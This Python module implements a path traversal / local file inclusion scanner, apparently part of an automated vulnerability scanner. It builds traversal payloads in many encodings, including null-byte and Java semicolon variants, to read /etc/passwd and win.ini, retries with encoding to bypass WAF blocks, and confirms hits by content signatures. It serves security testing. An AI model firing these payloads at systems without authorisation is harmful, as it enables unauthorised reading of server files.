"""Path Traversal / LFI scanner — structured verification chain.

Verification Chain (per param, one at a time):
  Step 1 - KNOWN FILE:  Inject traversal to /etc/passwd (or win.ini) →
                         check for known content signatures (root:x:0,
                         [extensions], etc.)
  Step 2 - DEPTH VARY:  Try different traversal depths (../../ vs ../../../)
                         → if BOTH return the same known-file content, it
                         confirms traversal (not just the app echoing input)
  Step 3 - NULL BYTE:   Try %00 truncation for legacy PHP (fname.php%00)
  Step 4 - ENCODING:    Try double-encoding, ..%2f..%2f, ..%252f bypass

GO/NO-GO logic:
  - KNOWN_FILE pass + DEPTH_VARY pass → CONFIRMED (high confidence)
  - KNOWN_FILE pass + DEPTH_VARY fail → medium (could be coincidence
    but likely real if known file content is specific enough)
  - KNOWN_FILE fail with all payloads → STOP

Non-destructive payloads ONLY:
  - /etc/passwd — universal readable file on Unix (no secrets)
  - /etc/hostname — short, distinctive content
  - C:\\windows\\win.ini — universal readable file on Windows
  - /etc/resolv.conf — another safe read target

Rules:
  - One parameter at a time
  - Sibling fields with defaults
  - Encode on WAF block
  - Several traversal techniques: basic, encoded, double-encoded, null byte
"""
from __future__ import annotations

import logging
from typing import Any
from urllib.parse import quote

from ..http import HttpClient, Session
from ..recipes.schema import Recipe
from .base import Scanner, Candidate

logger = logging.getLogger(__name__)

# ── Known file signatures ─────────────────────────────────────

# Each entry: (file_path_relative, [content_signatures])
# Signatures are substrings that MUST appear in the response for a match.
# Using multiple signatures reduces false positives.
_UNIX_TARGETS = [
    (
        "/etc/passwd",
        [
            ("root:", "root:x:0", ":0:"),  # Any of these = match
        ],
    ),
    (
        "/etc/hostname",
        [],  # No fixed signatures — used only as depth-vary confirmation
    ),
]

_WIN_TARGETS = [
    (
        "\\windows\\win.ini",
        [
            ("[extensions]", "[fonts]", "for 16-bit app support"),
        ],
    ),
    (
        "\\windows\\system.ini",
        [
            ("[drivers]", "[386Enh]", "woafont"),
        ],
    ),
]

# Additional safe Unix files for depth-vary confirmation
_UNIX_CONFIRM = "/etc/resolv.conf"

# ── Traversal payloads ────────────────────────────────────────

def _traversal_payloads(target_file: str, *, max_depth: int = 10) -> list[dict]:
    """Generate traversal payloads at various depths and encodings.

    Returns list of {payload, depth, encoding, technique} dicts.
    """
    payloads = []

    for depth in range(1, max_depth + 1):
        prefix = "../" * depth

        # Basic traversal
        payloads.append({
            "payload": f"{prefix}{target_file.lstrip('/')}",
            "depth": depth,
            "encoding": "none",
            "technique": "basic",
        })

        # URL-encoded dots/slashes: ..%2f
        encoded_prefix = "..%2f" * depth
        payloads.append({
            "payload": f"{encoded_prefix}{target_file.lstrip('/')}",
            "depth": depth,
            "encoding": "url",
            "technique": "encoded_slash",
        })

        # Double-encoded: ..%252f
        double_prefix = "..%252f" * depth
        payloads.append({
            "payload": f"{double_prefix}{target_file.lstrip('/')}",
            "depth": depth,
            "encoding": "double",
            "technique": "double_encoded",
        })

        # Backslash variant (for Windows or mixed parsers)
        bs_prefix = "..\\" * depth
        payloads.append({
            "payload": f"{bs_prefix}{target_file.lstrip('/')}",
            "depth": depth,
            "encoding": "none",
            "technique": "backslash",
        })

        # Null byte truncation (PHP < 5.3.4)
        payloads.append({
            "payload": f"{prefix}{target_file.lstrip('/')}%00",
            "depth": depth,
            "encoding": "null_byte",
            "technique": "null_byte",
        })

        # ..;/ bypass (Tomcat / Java path normalization)
        java_prefix = "..;/" * depth
        payloads.append({
            "payload": f"{java_prefix}{target_file.lstrip('/')}",
            "depth": depth,
            "encoding": "none",
            "technique": "java_semicolon",
        })

    # Absolute path (no traversal — direct inclusion)
    payloads.append({
        "payload": target_file,
        "depth": 0,
        "encoding": "none",
        "technique": "absolute",
    })

    return payloads


def _win_traversal_payloads(target_file: str, *, max_depth: int = 10) -> list[dict]:
    """Generate Windows-specific traversal payloads."""
    payloads = []

    for depth in range(1, max_depth + 1):
        prefix_fwd = "../" * depth
        prefix_bk = "..\\" * depth

        payloads.append({
            "payload": f"{prefix_fwd}{target_file.lstrip(chr(92))}",
            "depth": depth,
            "encoding": "none",
            "technique": "basic_win",
        })
        payloads.append({
            "payload": f"{prefix_bk}{target_file.lstrip(chr(92))}",
            "depth": depth,
            "encoding": "none",
            "technique": "backslash_win",
        })

    # Absolute
    payloads.append({
        "payload": f"C:{target_file}",
        "depth": 0,
        "encoding": "none",
        "technique": "absolute_win",
    })

    return payloads


# ── Scanner class ─────────────────────────────────────────────


class LfiScanner(Scanner):
    """Detects Path Traversal / Local File Inclusion (LFI).

    For each parameter (one at a time):
    1. KNOWN_FILE: inject ../../../etc/passwd → check for root:x:0
    2. DEPTH_VARY: try at different depths → confirm same content
    3. NULL_BYTE / ENCODING variants for bypasses

    Special handling:
    - WAF: URL-encode on 403, try once more
    - Windows target files (win.ini, system.ini)
    - Null byte truncation for legacy PHP
    - Double-encoding for WAF/filter bypasses
    - Java ..;/ semicolon bypass
    """

    vuln_classes = ["lfi", "path-traversal", "file-inclusion"]

    def __init__(self, client: HttpClient, session: Session):
        super().__init__(client)
        self.session = session

    async def _detect(self, target: str, recipe: Recipe,
                      **context: Any) -> list[Candidate]:
        params = context.get("params", [])
        method = context.get("method", "GET")
        id_location = context.get("id_location", "query")

        # Use injection_points from classifier if available
        injection_points = context.get("injection_points", [])

        if not params and not injection_points:
            return []

        candidates = []

        if injection_points:
            for point in injection_points:
                vuln_classes = point.get("vuln_classes", [])
                if not any(vc in vuln_classes for vc in self.vuln_classes):
                    continue

                param = point["param"]
                loc = point.get("location", id_location)
                meth = point.get("method", method)
                siblings = point.get("sibling_fields", {})

                result = await self._test_param(
                    target, param, meth, loc, recipe, siblings=siblings
                )
                if result:
                    candidates.append(result)
        else:
            siblings = context.get("siblings", {})
            for param in params:
                result = await self._test_param(
                    target, param, method, id_location, recipe,
                    siblings=siblings,
                )
                if result:
                    candidates.append(result)

        return candidates

    async def _test_param(
        self,
        target: str,
        param: str,
        method: str,
        id_location: str,
        recipe: Recipe,
        *,
        siblings: dict[str, str] | None = None,
    ) -> Candidate | None:
        """Run the full verification chain on a single parameter.

        Chain: KNOWN_FILE → DEPTH_VARY
        """
        log = {"param": param, "method": method, "location": id_location, "steps": []}

        # ── Step 0: Get baseline response ──
        try:
            baseline = await self._send(
                target, param, "normalvalue123", method, id_location,
                siblings=siblings,
            )
            baseline_status = baseline.status_code
            baseline_body = baseline.text[:5000].lower()
            baseline_len = len(baseline.text)
        except Exception as e:
            logger.debug("Baseline request failed for %s/%s: %s", target, param, e)
            return None

        # ── Step 1: KNOWN_FILE (Unix targets first, then Windows) ──
        known_result = await self._step_known_file(
            target, param, method, id_location,
            baseline_status, baseline_body,
            siblings=siblings,
        )
        log["steps"].append({"step": "known_file", "result": known_result})

        if not known_result["success"]:
            # All traversal payloads failed → STOP
            logger.debug("KNOWN_FILE failed for %s/%s — skipping", target, param)
            return None

        # ── Step 2: DEPTH_VARY — confirm with a different depth ──
        depth_result = await self._step_depth_vary(
            target, param, method, id_location,
            known_result,
            baseline_body,
            siblings=siblings,
        )
        log["steps"].append({"step": "depth_vary", "result": depth_result})

        if known_result["success"] and depth_result["success"]:
            # Both depths returned the same file content → CONFIRMED
            confidence = "high"
        elif known_result["success"]:
            # Single depth worked with strong signature match
            # Still high confidence if we matched specific content like root:x:0
            confidence = "high" if known_result.get("strong_match") else "medium"
        else:
            return None

        return self._make_candidate(
            recipe=recipe,
            endpoint=target,
            method=method,
            evidence={
                "technique": known_result.get("technique", "path-traversal"),
                "chain": log,
                "target_file": known_result["target_file"],
                "os_type": known_result.get("os_type", "unix"),
                "traversal_depth": known_result.get("depth"),
                "encoding": known_result.get("encoding"),
                "matched_signature": known_result.get("matched_sig"),
                "depth_vary_confirmed": depth_result["success"],
                "body_snippet": known_result.get("body_snippet", ""),
            },
            confidence=confidence,
            request_data={
                "param": param,
                "payload": known_result["payload"],
                "depth_vary_payload": depth_result.get("payload", ""),
                "id_location": id_location,
                "technique": known_result.get("technique", "path-traversal"),
                "sibling_fields": siblings or {},
            },
            response_data={
                "status": known_result.get("status"),
                "content_length": known_result.get("content_length"),
            },
        )

    # ── Chain steps ──────────────────────────────────────────────

    async def _step_known_file(
        self, target: str, param: str, method: str, id_location: str,
        baseline_status: int, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 1: KNOWN_FILE — traverse to a known file, check signatures.

        Tries Unix files first (/etc/passwd), then Windows (win.ini).
        """
        # Try Unix targets
        for file_path, sig_groups in _UNIX_TARGETS:
            if not sig_groups:
                continue  # Skip files without signatures for first pass

            result = await self._try_file(
                target, param, method, id_location,
                file_path, sig_groups, "unix",
                baseline_body, siblings=siblings,
            )
            if result["success"]:
                return result

        # Try Windows targets
        for file_path, sig_groups in _WIN_TARGETS:
            if not sig_groups:
                continue

            result = await self._try_file(
                target, param, method, id_location,
                file_path, sig_groups, "windows",
                baseline_body, siblings=siblings,
            )
            if result["success"]:
                return result

        return {"success": False}

    async def _try_file(
        self, target: str, param: str, method: str, id_location: str,
        file_path: str, sig_groups: list[tuple], os_type: str,
        baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Try traversal payloads for a specific target file."""
        if os_type == "windows":
            all_payloads = _win_traversal_payloads(file_path)
        else:
            all_payloads = _traversal_payloads(file_path)

        for pinfo in all_payloads:
            payload = pinfo["payload"]

            try:
                resp = await self._send(
                    target, param, payload, method, id_location,
                    siblings=siblings,
                )
                status = resp.status_code
                body = resp.text[:8000].lower()

                # WAF check → try URL-encoded once
                if status == 403:
                    encoded = quote(payload, safe="")
                    resp = await self._send(
                        target, param, encoded, method, id_location,
                        siblings=siblings,
                    )
                    status = resp.status_code
                    body = resp.text[:8000].lower()
                    if status == 403:
                        continue

                # Skip if response is same as baseline (no traversal effect)
                if body == baseline_body:
                    continue

                # Check content signatures
                for sig_tuple in sig_groups:
                    for sig in sig_tuple:
                        sig_lower = sig.lower()
                        if sig_lower in body and sig_lower not in baseline_body:
                            # Determine match strength
                            strong = sig_lower in ("root:x:0", "[extensions]",
                                                    "[fonts]", "[drivers]",
                                                    "[386enh]")

                            return {
                                "success": True,
                                "payload": payload,
                                "target_file": file_path,
                                "depth": pinfo["depth"],
                                "encoding": pinfo["encoding"],
                                "technique": pinfo["technique"],
                                "os_type": os_type,
                                "status": status,
                                "matched_sig": sig,
                                "strong_match": strong,
                                "content_length": len(resp.text),
                                "body_snippet": resp.text[:500],
                            }

            except Exception as e:
                logger.debug("KNOWN_FILE error for %s/%s payload=%s: %s",
                             target, param, payload[:50], e)
                continue

        return {"success": False}

    async def _step_depth_vary(
        self, target: str, param: str, method: str, id_location: str,
        known_result: dict, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 2: DEPTH_VARY — confirm with a different traversal depth.

        If the initial find was at depth=5, try depth=8. If both return the
        same known-file content, it's definitely traversal (the extra ../'s
        are absorbed by the filesystem root).
        """
        if not known_result.get("success"):
            return {"success": False}

        original_depth = known_result.get("depth", 5)
        target_file = known_result["target_file"]
        matched_sig = known_result.get("matched_sig", "").lower()
        technique = known_result.get("technique", "basic")

        # Pick a different depth (at least 2 levels apart)
        alt_depths = [d for d in [3, 5, 7, 9] if abs(d - original_depth) >= 2]
        if not alt_depths:
            alt_depths = [original_depth + 3]

        for alt_depth in alt_depths:
            # Build payload with same technique but different depth
            if technique in ("basic", "absolute"):
                prefix = "../" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}"
            elif technique == "encoded_slash":
                prefix = "..%2f" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}"
            elif technique == "double_encoded":
                prefix = "..%252f" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}"
            elif technique == "backslash" or technique == "backslash_win":
                prefix = "..\\" * alt_depth
                payload = f"{prefix}{target_file.lstrip(chr(92))}"
            elif technique == "java_semicolon":
                prefix = "..;/" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}"
            elif technique == "null_byte":
                prefix = "../" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}%00"
            elif technique == "basic_win":
                prefix = "../" * alt_depth
                payload = f"{prefix}{target_file.lstrip(chr(92))}"
            else:
                prefix = "../" * alt_depth
                payload = f"{prefix}{target_file.lstrip('/')}"

            try:
                resp = await self._send(
                    target, param, payload, method, id_location,
                    siblings=siblings,
                )
                body = resp.text[:8000].lower()
                status = resp.status_code

                # Check if the same signature appears
                if matched_sig and matched_sig in body and matched_sig not in baseline_body:
                    return {
                        "success": True,
                        "payload": payload,
                        "alt_depth": alt_depth,
                        "status": status,
                    }

            except Exception as e:
                logger.debug("DEPTH_VARY error for %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    # ── HTTP helper ──────────────────────────────────────────────

    async def _send(self, target: str, param: str, value: str,
                    method: str, id_location: str,
                    *, siblings: dict[str, str] | None = None):
        """Send a request with the payload injected at the right location."""
        if id_location == "query":
            params = dict(siblings) if siblings else {}
            params[param] = value
            return await self.client.request(
                method, target, session=self.session,
                params=params,
            )
        elif id_location == "body":
            data = dict(siblings) if siblings else {}
            data[param] = value
            return await self.client.post(
                target, session=self.session,
                data=data,
            )
        elif id_location == "path":
            url = target.rstrip("/") + f"/{value}"
            return await self.client.request(method, url, session=self.session)
        else:
            raise ValueError(f"Unknown id_location: {id_location}")
